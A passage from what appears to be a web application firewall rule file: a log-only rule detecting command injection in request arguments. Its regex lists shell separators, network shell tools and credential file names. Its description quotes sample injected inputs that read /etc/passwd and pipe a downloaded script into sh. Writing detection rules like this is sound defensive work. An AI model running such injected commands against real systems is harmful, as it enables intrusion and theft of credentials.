    {
      "id": "vn_rce_0025",
      "name": "Remote Command Execution — Path-Guarded Commands (log-only)",
      "category": "rce",
      "severity": "high",
      "action": "log",
      "enable": true,
      "priority": 40,
      "matcher": {
        "Composite": {
          "operator": "AND",
          "conditions": [
            {
              "Composite": {
                "operator": "NOT",
                "conditions": [
                  {
                    "URI": {
                      "operator": "≈",
                      "value": "(?i)^/(?:phpmyadmin|phpminiadmin|adminer)(?:\\.php)?(?:/|$)"
                    }
                  }
                ]
              }
            },
            {
              "Args": {
                "name_operator": "*",
                "operator": "≈",
                "value": "(?:\\|{1,2}|&&?|;|`|\\$\\(|\\$\\{)\\s*(?:(?:rm|cp|mv|chmod|chown|dd|mkfs|ssh|scp|nc|ncat|netcat|socat|tftp|telnet|ftp|mount|umount|crontab|nohup|pkill|base64|openssl|cmd|powershell|bash|sh|zsh|python[0-9.]*|perl|ruby|php[0-9.]*|node|lua|gcc|make|eval|exec|system|wget|curl|cat|head|tail|touch|env|printenv|ps|df|kill|ping|dig|nslookup|whois|traceroute|netstat|ifconfig|route)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)\\s*(?:[-/(\\[@]\\S*|\\S*/\\S*|\\S*@\\S*|\\S*\\.[A-Za-z]\\S*|\\S+\\s+[-/(\\[@]\\S*|\\d{1,3}(?:\\.\\d{1,3}){2,}|[A-Za-z][\\w-]*\\d(?![A-Za-z])|(?:passwd|shadow|id_rsa|secrets?|credentials?|tokens?)(?![A-Za-z]))|(?:ls|id|whoami|uname|hostname|pwd)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)(?:\\s*(?:[-/(\\[@]\\S*|\\S*/\\S*|\\S*@\\S*|\\S*\\.[A-Za-z]\\S*|\\S+\\s+[-/(\\[@]\\S*|\\d{1,3}(?:\\.\\d{1,3}){2,}|[A-Za-z][\\w-]*\\d(?![A-Za-z])|(?:passwd|shadow|id_rsa|secrets?|credentials?|tokens?)(?![A-Za-z]))|(?:\\s*$|[\\x60;|&)}\\]]|[^\\x00-\\x7f])))"
              }
            }
          ]
        }
      },
      "description": "Logs shell commands (full command list incl. rm/ssh/nc, path/flag/URL/@host/sensitive-word arguments, bare recon commands) anywhere in the value — observe-only companion of vn_rce_0007. Data-URI/CSV shapes and filler/CJK prose stay out; rare jpeg/svg data URIs may log. v19: separator set extended with '&', '&&' and '||' to match vn_rce_0007 — '&&cat /etc/passwd' and '&&wget http://x/y.sh|sh' previously matched neither tier.",
      "tags": [],
      "version": 3,
      "created_at": "2026-10-13T08:32:06Z",
      "updated_at": "2026-10-14T02:20:00Z",
